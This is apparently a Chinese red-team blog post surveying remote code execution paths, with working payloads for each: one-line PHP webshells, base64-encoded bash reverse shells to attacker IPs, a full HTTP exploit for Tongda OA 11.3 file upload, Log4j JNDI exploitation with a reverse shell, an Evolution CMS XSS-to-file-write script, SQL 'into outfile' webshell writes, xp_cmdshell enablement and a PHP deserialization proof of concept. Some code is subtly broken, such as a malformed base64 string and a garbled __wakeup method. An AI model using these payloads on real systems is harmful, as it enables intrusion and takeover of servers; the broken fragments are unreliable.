#  总结RCE漏洞(常见RCE的组合案例）   
原创 LULU  红队蓝军   2024-09-06 18:02  
  
## RCE原理   
  
RCE(remote command/code execute)  
  
即**远程命令**/**代码执行**。可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。RCE分为远程命令执行ping和远程代码执行evel。  
  
在 Web 应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。  
### php命令执行函数  
```
system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()

```  
### php代码执行函数  
```
eval()、assert()、preg_replace()、create_function()、array_map()、
call_user_func()、call_user_func_array()、array_filter()、uasort()、文件操作函数、动
态函数（$a($b)）

```  
  
**PHP中可以执行代码的函数，常用于编写一句话木马，可能导致代码执行漏洞。比如**  
```
<?php eval($_REQUEST[6]);?>
<?php assert($_REQUEST[6]);?>
<?php @preg_replace("/abc/e",$_REQUEST[6],"abcd");?>

```  
### Java命令执行函数  
```
Runtime.getRuntime().exec  、ProcessBuilder

```  
  
注：Runtime.exec类型的RCE如果要反弹shell需要特殊处理：  
  
原命令：bash -i >& /dev/tcp/IP/7788 0>&1  
  
处理后：bash -cecho,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4SDwLjEvMTIzNDUgMD4mMQ==}{base64,-d|{bash,-i}  
  
Java没有直接的代码执行函数  
### 命令连接符  
  
**Windows** **系列支持的管道如下所示：**  
```
"|":直接执行后面的语句，如：ping 127.0.0.1 | whoami
"||":如果前面执行的语句执行出错，则执行后面的语句，前面的语句只能为假。例如：ping 2 ||whoami
"&"：如果前面的语句为假则直接执行后面的语句，前面的语句可能为假。例如：ping 127.0.0.1&whoami
"&&"：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真。例如：ping 127.0.0.1 && whoami

```  
```
shell_exec('mysqldump -uroot -proot --databases doucms > D:/doucms.sql');
// D:/doucms.sql 这个是可控的参数
// $path = 'D:/doucms.sql';
// 修改这个参数
// $path = 'D:/douc&whoami&ms.sql';
// $path = 'D:/douc&echo "<?php eval($_REQUEST[6]);?>" > shell.php&ms.sql';

```  
  
**Linux**系列支持的管道如下所示：  
```
";":执行完前面的语句再执行后面的。如：ping 127.0.0.1；whoami
"|"：显示后面语句的执行结果。如：ping 127.0.0.1 | whoami
"||"：当前面的语句执行出错时，执行后面的语句。例如：ping 127.0.0.1 || whoami
"&"：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。如：Ping 127.0.0.1 &whoami
"&&"：如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真。如：ping 127.0.0.1&& whoami

```  
## 常见RCE的类型   
### 若是发现了基础危害不大的漏洞，不建议直接提交的，而是应该想办法看，能不能对该漏洞进行升级，扩大其危害。比如文件包含漏洞，威力不大，如果与RCE结合起来，危害就不一样了。文件包含不算常见，经常出现在php程序中。文件上传漏洞导致RCE  
  
**环境**：通达OA11.3  
  
在/ispirit/im/upload.php 中上传文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4Qrp5RsicPia2VLnC1OYy80xyj0RlR9HnZWHTAhh0RFicbKdyqJMcuusVKYggLgoiaxtKUuUs6icy2GuQ/640?wx_fmt=png&from=appmsg "")  
  
文件内容  
```
<?php
//保存为jpg
 $command=$_POST['cmd'];
    $wsh=new COM("Wscript.Shell");  
    $exec=$wsh->exec("cmd.exe /c ".$command);  
    $stdout = $exec->StdOut();  
    $stroutput = $stdout->ReadAll();  
    echo $stroutput;
?>

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4Qrp5RsicPia2VLnC1OYy80xXWrlop0TPPk5ibOekDZI5ygb8AVD655PCia6slIZa29Uib2kEx1I8eeJg/640?wx_fmt=png&from=appmsg "")  
  
2003是文件夹名，1084355136|test.jpg是文件名,要把 | 修改成点，请求相对应版本的gateway.php ，修改对应版本路径文件，和对应图片马上传的路径和文件名，header头添加Content-Type: application/x-www-form-urlencoded  
  
**执行任意命令**  
```
POST /ispirit/interface/gateway.php HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 69

json={"url":"/general/../../attach/im/2003/上传的文件名.jpg"}&cmd=whoami（可以是任意命令）

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4Qrp5RsicPia2VLnC1OYy80x0dMwbGXG7oECVZ97NAgAV04sR0VPhfwoLBNeoaUK1XSb5FHH8BZ9ag/640?wx_fmt=png&from=appmsg "")  
### JNDI注入导致RCE  
  
**环境**：  
  
2.0 ≤ Apache Log4j2 < 2.15.0-rc2  
  
拉取靶场镜像:docker pull vulfocus/log4j2-rce-2021-12-09:latest  
  
**利用JNDI工具**  
```
安装：git clone https://github.com/welk1n/JNDI-Injection-Exploit.git
切换目录：cd JNDI-Injection-Exploit
编译安装：mvn clean package -DskipTests 
切换到target目录  cd target

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4Qrp5RsicPia2VLnC1OYy80xeO2NsM1p4OKUcfqxBVRwS4xyRcCbib2iaKg3gticeEP7icjNKvSYSRK8pg/640?wx_fmt=png&from=appmsg "")  
  
使用 JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar，依赖Java 版本1.8 或者1.7  
```
工具使用方式：java-jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -c"命令" -A “攻击机的IP”

```  
  
**服务器站点部署**  
  
部署：RMI服务或者LDAP服务  
  
目的:是要让受害者访问攻击者准备的恶意服务器，从而执行恶意代码，主要是获得受害者的权限，那么可以执行反弹shell的命令。  
  
将反弹shell通过JNDI注入工具部署在LDAP服务 或者RMI 服务中  
  
**利用工具得到payload**  
```
反弹shell命令：bash -i >& /dev/tcp/192.168.1.1/7788 0>&1  注：这里可以构造任意命令，base64编码。
base64编码后
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTA4Lzc3ODggMD4mMQoKCg==}|{base64,-d}|{bash,-i}

运行：java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTA4Lzc3ODggMD4mMQoKCg==}|{base64,-d}|{bash,-i}" -A "192.168.1.1"

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4Qrp5RsicPia2VLnC1OYy80x2RNEVvsibDPyPd7WQuH6Clqh7lTwLnjKl00BErY22A5zlzAkdiaxsY0w/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4Qrp5RsicPia2VLnC1OYy80xic2LMXDSu1vgWf8pcTnibSvKs5P4mp0nKib2DCK2pibfaQkicO1DL8qwCzQ/640?wx_fmt=png&from=appmsg "")  
### XSS漏洞导致的RCE  
  
**环境**：Evolution CMS 3.2.3  
  
Evolution CMS存在跨站脚本漏洞，该漏洞源于uid参数对用户提供的数据缺乏有效过滤与转义，攻击者可利用该漏洞通过注入精心设计的有效载荷执行任意Web脚本或HTML  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4Qrp5RsicPia2VLnC1OYy80x9XUn1gJus7SjeG4erTP3Jbqgm4fEqdBLrCYV1DPxRiaSejmqH0Zgwibg/640?wx_fmt=png&from=appmsg "")  
  
插入payload，验证xss漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4Qrp5RsicPia2VLnC1OYy80xFHQlhLXvfUsYQEeWutZ0QOTibr80ibiaPLxqqfBrDGgpLqjjOcxb69CvQ/640?wx_fmt=png&from=appmsg "")  
  
在Evolution CMS后台不能上传后缀为php的文件，利用javascript 实现文件编辑的功能，修改 index.php 的内容为 phpinfo()  
  
构造 payload  
```
$.get('/manager/?a=31',function(d) {
  let p = $(d).contents().find('input[name=\"path\"]').val();
  $.ajax({
    url:'/manager/index.php',
    type:'POST',
    contentType:'application/x-www-form-urlencoded',
    data:'a=31&mode=save&path='+p+'/index.php&content=<?php phpinfo(); ?>'} #可以修改成任意命令
  );
});

```  
  
将payload进行base64编码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4Qrp5RsicPia2VLnC1OYy80xAAghg32erPcMfq2dgYBqJw0BicZzhYqlJcHG5iaFasqKUfwQXLMNFnCg/640?wx_fmt=png&from=appmsg "")  
  
访问url  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4Qrp5RsicPia2VLnC1OYy80xrWnB8ibLhmxQPV20k8SDpSwXtCPvCbl2r26hyktTUIHicLLOyXicWe9Ig/640?wx_fmt=png&from=appmsg "")  
### SQL注入漏洞导致RCE  
#### DBA权限  
  
**条件**  
```
1、root账户登录
2、知道绝对路径
3、secure_file_priv=“ ” 可以向任意绝对路径写文件，在my.ini中进行配置

```  
```
mysql> show global variables like '%secure_file_priv%';
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
1 row in set, 1 warning (0.00 sec)

```  
  
执行命令  
```
mysql> select '<?php @eval($_REQUEST[6]);?>' into outfile 'D:/www/shell.php';
Query OK, 1 row affected (0.00 sec)

mysql>

```  
#### sql server注入RCE  
  
使用xp_cmdshell，需要开启xp_cmdshell,只有sa权限才可以开启  
```
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;

```  
  
注：在高版本的sql server中已经无法使用xp_cmdshell  
```
EXEC master.dbo.xp_cmdshell 'whoami'

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4Qrp5RsicPia2VLnC1OYy80xskF00fib9V9PgDRroBDF7Ry0toUBbosvVCPjjvD4vHTZpffZldKRcew/640?wx_fmt=png&from=appmsg "")  
### 反序列化漏洞导致RCE  
  
写一个demo  
```
<?php
header("content-type:text/html;charset=utf-8");
class Cat{
public $name = "猫";
public function __wakeupeval($this->name);
}
}
// 接收参数
$data = $_REQUEST['data'];
// 反序列化
unserialize($data);

```  
  
构造poc  
```
O:3:"Cat":1:{s:4:"name";s:10:"phpinfo();";}

#O:3:"cat": 这部分指明了被序列化的是一个对象(O)。3表示类名的字符数，"cat"是类名。
#1: 表明对象有一个属性。这是属性计数，用来指明接下来会有多少个属性-值对。
#s:4:"name";: 这是属性名。s表示字符串，4是属性名"name"的长度。
#s:10:"phpinfo();";: 这是属性的值。s同样表示字符串，10是值"phpinfo();"的长度

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4Qrp5RsicPia2VLnC1OYy80xBGlehMEhI8QEAuEA5DTPGUiasAcAsvbtZUr3xjY1qSibjFjm50gWINtA/640?wx_fmt=png&from=appmsg "")  
  
这里可以将phpinfo()改成任意命令，比如file_put_contents('shell.php','  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v4Qrp5RsicPia2VLnC1OYy80xOn6IAlYWicxxLLvUU6mpMtfwrBhuZNZJ7c350Fvh8YZfwSsN7jL0wPA/640?wx_fmt=png&from=appmsg "")  
  
  
加下方wx，拉你一起进群学习  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibZ6uZjjH3v5KP8CaWoS7GAJnWQQxPpibNdibOdl0hc3X6uuBy7rLVOoxS0OSd4vdHWcibFpZg9T9Bx6T7Rn87RoIw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
